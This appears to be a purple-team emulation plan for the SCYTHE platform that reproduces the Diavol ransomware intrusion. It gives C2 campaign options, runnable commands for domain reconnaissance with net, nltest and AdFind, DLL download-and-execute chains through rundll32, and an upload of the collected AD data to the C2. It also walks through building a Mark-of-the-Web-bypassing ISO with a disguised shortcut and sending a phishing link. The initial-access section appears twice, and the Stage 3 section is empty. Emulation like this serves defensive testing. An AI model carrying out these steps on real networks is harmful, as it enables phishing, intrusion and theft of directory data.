# Diavol Ransomware Adversary Emulation Plan

This threat is based on The DFIR Report post on December 13, 2021: https://thedfirreport.com/2021/12/13/diavol-ransomware/

This is a multi-stage threat that requires multiple SCYTHE campaigns for end-to-end execution. The initial access procedures leverage multiple defense evasion steps that would be wise to test in your enviornment.

## Automated Emulation with SCYTHE
### Diavol Stage 1
1. Download and import the threats in JSON format to your SCYTHE instance
2. Download the Virtual File System (VFS) files under Diavol/VFS
3. Upload the VFS files to your SCYTHE VFS in the following location: VFS:/shared/Diavol
4. Create a new campaign `DiavolStage1` with HTTPS and the communication options from the CTI: `--cp yourdomain[.]com:443 --secure true --multipart 10240 --heartbeat 5 --jitter 10`
5. Import from Existing Threat: DiavolStage1
6. Launch the Campaign
7. Download payload in DLL format setting the entry-point to `BasicScore`
8. Save the DLL as `SharedFiles.dll`
9. Start Stage 2 and Stage 3 before execution
10. Follow steps for preparing initial access

### Diavol Stage 2
1. Create a new campaign `DiavolStage2` with HTTPS and the communication options from the CTI: `--cp yourdomain[.]com:443 --secure true --multipart 10240 --heartbeat 5 --jitter 10`
2. Import from Existing Threat: DiavolStage2
3. Launch the Campaign
4. Download payload in DLL format setting the entry-point to `EnterDll`
5. Save the DLL as `tfpkuengdlu.dll`
6. Upload the `tfpkuengdlu.dll` to the VFS under VFS:/shared/Diavol

### Diavol Stage 3
1. Create a new campaign `DiavolStage3` with HTTPS and the communication options from the CTI: `--cp yourdomain[.]com:443 --secure true --multipart 10240 --heartbeat 5 --jitter 10`
2. Import from Existing Threat: DiavolStage3
3. Launch the Campaign
4. Download payload in DLL format setting the entry-point to `EnterDll`
5. Save the DLL as `uvvfvnnswte.dll`
6. Upload the `uvvfvnnswte.dll` to the VFS under VFS:/shared/Diavol

### Preparing Initial Access
1. Copy the src folder from our [Compound Actions GitHub for T1553.005](https://github.com/scythe-io/compound-actions/tree/main/T1553.005%20-%20Mark-of-the-Web%20Bypass/src) to a working directory on your Windows system. Note we are using the Folder2Iso project to create the ISO.
2. Put the SCYTHE DLL in the Folder2Iso of the working directory.
3. In the Folder2Iso directory, create a shortcut called `Documents` and set the `Target` to: `C:\Windows\System32\rundll32.exe SharedFiles.dll,BasicScore`
4. Open a Windows command prompt and cd to the working directory.
5. Run `Folder2Iso.exe "Folder2Iso" "%USERPROFILE%\Downloads\new-documents-2005.iso" "Diavol" 0 0 0 "None"` This will take all the content of the Folder2Iso folder and create an ISO of it.
6. Zip the ISO and call it `new-documents-2005.zip`
7. Upload the zip file to Microsoft OneDrive and copy the link.
8. Send a phishing email with the link to the Microsoft OneDrive zip file. 
9. If the end user downloads the ZIP and double clicks the ISO, it will be mounted on their endpoint. The user will need to double click the shortcut to begin execution.

## Manual Emulation
### Diavol Stage 1
```
delay --time 900
loader --load run
run net group /domain
run net group /domain "Domain Admins"
run net group "Domain Computers" /domain
run net localgroup administrators
run net view /all
run nltest /domain_trusts /all_trusts
delay --time 6000
loader --load downloader
downloader --src "VFS:/shared/Diavol/tfpkuengdlu.dll" --dest "%USERPROFILE%\AppData\Local\Temp\tfpkuengdlu.dll"
run rundll32.exe "%USERPROFILE%\AppData\Local\Temp\tfpkuengdlu.dll",EnterDll
controller --shutdown
```

### Diavol Stage 2
```
loader --load run
run ipconfig /all
run net user USER /domain
run cmd.exe /c mkdir "%USERPROFILE%\Desktop\Diavol"
run cmd.exe /c mkdir "%USERPROFILE%\Desktop\Diavol\adfind"
run cmd.exe /c mkdir "%USERPROFILE%\Desktop\Diavol\adfind\results"
loader --load downloader
downloader --src "VFS:/shared/Diavol/adf.bat" --dest "%USERPROFILE%\Desktop\Diavol\adfind\adf.bat"
downloader --src "https://www.joeware.net/downloads/files/AdFind.zip" --dest "%USERPROFILE%\Desktop\Diavol\adfind\AdFind.zip"
run cmd /c powershell -Command Expand-Archive %USERPROFILE%\Desktop\Diavol\adfind\AdFind.zip -DestinationPath %USERPROFILE%\Desktop\Diavol\adfind\
run cmd /c "start %USERPROFILE%\Desktop\Diavol\adfind\adf.bat"
delay --time 600
run powershell Compress-Archive "%USERPROFILE%\Desktop\Diavol\adfind\results\" "%USERPROFILE%\Desktop\Diavol\adfind\adf.zip
loader --load uploader
uploader --remotepath "%USERPROFILE%\Desktop\Diavol\adfind\adf.zip"
run cmd /c rmdir /Q /S "%USERPROFILE%\Desktop\Diavol\adfind"

downloader --src "VFS:/shared/Diavol/uvvfvnnswte.dll" --dest "%USERPROFILE%\AppData\Local\Temp\uvvfvnnswte.dll"
run rundll32.exe "%USERPROFILE%\AppData\Local\Temp\uvvfvnnswte.dll",EnterDll
controller --shutdown
```

### Diavol Stage 3

### adf.bat
```
%USERPROFILE%\Desktop\Diavol\adfind\AdFind.exe -f "(objectcategory=person)" > %USERPROFILE%\Desktop\Diavol\adfind\results\ad-users.txt
%USERPROFILE%\Desktop\Diavol\adfind\AdFind.exe -f "objectcategory=computer" > %USERPROFILE%\Desktop\Diavol\adfind\results\ad_computers.txt
%USERPROFILE%\Desktop\Diavol\adfind\AdFind.exe -f "(objectcategory=organizationalUnit)" > %USERPROFILE%\Desktop\Diavol\adfind\results\ad_ou.txt
%USERPROFILE%\Desktop\Diavol\adfind\AdFind.exe -sc trustdmp > %USERPROFILE%\Desktop\Diavol\adfind\results\ad_trustdmp.txt
%USERPROFILE%\Desktop\Diavol\adfind\AdFind.exe -subnets -f (objectCategory=subnet) > %USERPROFILE%\Desktop\Diavol\adfind\results\ad_subnet.txt
%USERPROFILE%\Desktop\Diavol\adfind\AdFind.exe -f "(objectcategory=group)" > %USERPROFILE%\Desktop\Diavol\adfind\results\ad_group.txt
%USERPROFILE%\Desktop\Diavol\adfind\AdFind.exe -gcb -sc trustdmp > %USERPROFILE%\Desktop\Diavol\adfind\results\ad_trustdmp2.txt
```

### Preparing Initial Access
1. Copy the src folder from our [Compound Actions GitHub for T1553.005](https://github.com/scythe-io/compound-actions/tree/main/T1553.005%20-%20Mark-of-the-Web%20Bypass/src) to a working directory on your Windows system. Note we are using the Folder2Iso project to create the ISO.
2. Put the SCYTHE DLL in the Folder2Iso of the working directory.
3. In the Folder2Iso directory, create a shortcut called `Documents` and set the `Target` to: `C:\Windows\System32\rundll32.exe SharedFiles.dll,BasicScore`
4. Open a Windows command prompt and cd to the working directory.
5. Run `Folder2Iso.exe "Folder2Iso" "%USERPROFILE%\Downloads\new-documents-2005.iso" "Diavol" 0 0 0 "None"` This will take all the content of the Folder2Iso folder and create an ISO of it.
6. Zip the ISO and call it `new-documents-2005.zip`
7. Upload the zip file to Microsoft OneDrive and copy the link.
8. Send a phishing email with the link to the Microsoft OneDrive zip file. 
9. If the end user downloads the ZIP and double clicks the ISO, it will be mounted on their endpoint. The user will need to double click the shortcut to begin execution.